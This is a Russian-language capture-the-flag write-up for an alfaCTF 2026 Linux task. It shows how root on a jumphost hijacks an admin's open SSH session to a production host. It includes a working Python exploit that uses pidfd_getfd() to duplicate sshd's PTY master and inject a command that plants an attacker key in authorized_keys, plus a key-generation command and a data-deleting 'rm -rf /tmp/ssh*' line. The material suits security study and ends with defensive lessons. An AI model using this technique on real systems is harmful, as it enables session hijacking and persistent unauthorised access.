# Quitting — alfaCTF 2026

**Категория:** Infra / Linux  
**Сложность:** Medium  
**Теги:** linux, syscalls, pidfd, pty-injection, ssh, lateral-movement  
**Флаг:** `alfa{AdmiN_n07_f0UND_bUt_his_keYs_4re_in_5af3_hAnds}`

## Описание

Подключаемся по SSH к jumphost как пользователь `quitting` и получаем root-шелл. На jumphost уже есть активная сессия `admin`, который **с jumphost** подключён по SSH **на** `tracker-prod` — целевой сервер. Задача — перехватить эту сессию, попасть на tracker-prod и забрать флаг.

## Разведка

После подключения к jumphost (`root@jumphost`) изучаем процессы:

```
root   29  sshd: admin [priv]
admin  44  sshd: admin@pts/1
admin  45  sh -c sleep 1 && rm -rf /tmp/ssh* & ssh -l admin tracker-prod bash
admin  47  ssh -l admin tracker-prod bash
```

Ключевые наблюдения:

- `admin` подключён к jumphost по SSH с **пробросом агента** (`SSH_AUTH_SOCK` установлен).
- Его сессия запускает `ssh -l admin tracker-prod bash` — активное SSH-соединение к `tracker-prod`.
- Параллельно работает диверсионный скрипт: `sleep 1 && rm -rf /tmp/ssh*` — **удаляет сокет SSH-агента** через ~1 секунду. Переиспользовать агент для новых соединений нельзя.

Проверяем:

- `tracker-prod` резолвится в `10.0.243.2` (`getent hosts tracker-prod`).
- SSH на tracker-prod требует аутентификацию: `Permission denied (publickey,password)`.
- Других открытых портов на tracker-prod нет.
- Приватного ключа `admin` на jumphost нет (только `authorized_keys` и `known_hosts`).

## Неудачные подходы

1. **TIOCSTI ioctl** — инъекция нажатий клавиш в TTY admin (pts/1). Не работает: sysctl `kernel.legacy_tiocsti` равен `0`, а файловая система read-only — включить нельзя.
2. **Запись в `/proc/PID/fd/N`**, где `fd` указывает на `/dev/pts/ptmx`, — это **создаёт новый мастер PTY** вместо записи в существующий. Байты уходят в никуда.
3. **Переиспользование сокета SSH-агента** — удалён скриптом `rm -rf /tmp/ssh*` в течение ~1 с после старта сессии. Файл сокета уничтожен раньше, чем мы успеваем `connect()`.
4. **Перебор паролей** — учётные данные из задания и стандартные пароли не подошли.
5. **gdb / nc / socat** — не установлены в минимальном контейнере.

## Решение: `pidfd_getfd()`

Идея: писать нужно в **настоящий файловый дескриптор мастера PTY**, принадлежащий sshd, а не открывать `/dev/pts/ptmx` (это создаёт новую пару PTY).

Системный вызов Linux `pidfd_getfd()` (с ядра 5.6) дублирует файловый дескриптор из другого процесса **без повторного открытия файла**. Как root мы имеем необходимое право `PTRACE_MODE_ATTACH_REALCREDS`.

**Шаг 1 — генерируем SSH-ключ на jumphost:**

```bash
ssh-keygen -t ed25519 -f /tmp/mykey -N ""
```

**Шаг 2 — дублируем мастер-PTY из sshd и пишем командную строку:**

```python
import ctypes, os

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype = ctypes.c_long

SYS_pidfd_open  = 434  # x86_64
SYS_pidfd_getfd = 438

sshd_pid = 29  # sshd: admin [priv] — мастер PTY на fd 3

pidfd     = libc.syscall(SYS_pidfd_open, ctypes.c_int(sshd_pid), ctypes.c_int(0))
master_fd = libc.syscall(SYS_pidfd_getfd, ctypes.c_int(pidfd), ctypes.c_int(3), ctypes.c_int(0))

pubkey = open('/tmp/mykey.pub').read().strip()
cmd    = f'\nmkdir -p ~/.ssh; echo "{pubkey}" >> ~/.ssh/authorized_keys\n'.encode()
os.write(master_fd, cmd)
```

Куда уходят байты:

- Запись в мастер PTY помещает символы во входную очередь pts/1.
- SSH-клиент (PID 47) читает из pts/1 как из stdin.
- Он пересылает их через SSH-канал в `bash` на tracker-prod.
- Bash на tracker-prod выполняет `mkdir -p ~/.ssh; echo "..." >> ~/.ssh/authorized_keys`.

**Шаг 3 — заходим напрямую с подсаженным ключом:**

```bash
ssh -i /tmp/mykey admin@tracker-prod 'cat /home/admin/flag.txt'
```

## Флаг

`alfa{AdmiN_n07_f0UND_bUt_his_keYs_4re_in_5af3_hAnds}`

## Главные выводы

- `pidfd_getfd()` — правильный примитив для «одолжить fd у чужого процесса»: в отличие от `/proc/PID/fd/N`, который переоткрывает inode, он шарит существующий open-file description, что критично для `/dev/pts/ptmx` (повторное открытие создаёт новую пару PTY).
- Отключение `TIOCSTI` не защищает от привилегированной инъекции в TTY — root всё равно может писать в мастер через дублирование fd. Защищать TTY-сессии нужно на уровне получения дескриптора, а не только на уровне ioctl.
- Установленные SSH-соединения переживают удаление сокета агента: сокет нужен для **новых** соединений, а уже открытый канал работает без файла сокета — диверсия скрипта не убивает сессию.
